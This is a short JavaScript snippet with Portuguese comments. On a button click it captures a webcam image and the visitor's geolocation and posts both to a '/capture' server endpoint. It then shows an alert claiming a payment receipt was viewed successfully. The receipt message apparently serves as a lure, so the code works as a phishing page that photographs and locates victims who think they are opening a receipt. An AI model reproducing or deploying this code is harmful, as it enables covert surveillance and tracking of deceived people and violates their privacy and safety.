document.getElementById('btnCapture').addEventListener('click', async () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Solicitar acesso à câmera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Aguardar 2 segundos para garantir que a câmera está ativa
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Capturar imagem da câmera
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL('image/png');

    // Solicitar acesso à localização
    navigator.geolocation.getCurrentPosition(position => {
        const location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
        };

        // Enviar dados para o servidor
        fetch('/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ image: imageData, location: location })
        }).then(response => {
            if (response.ok) {
                alert('Comprovante visualizado com sucesso!');
            }
        });
    });
});
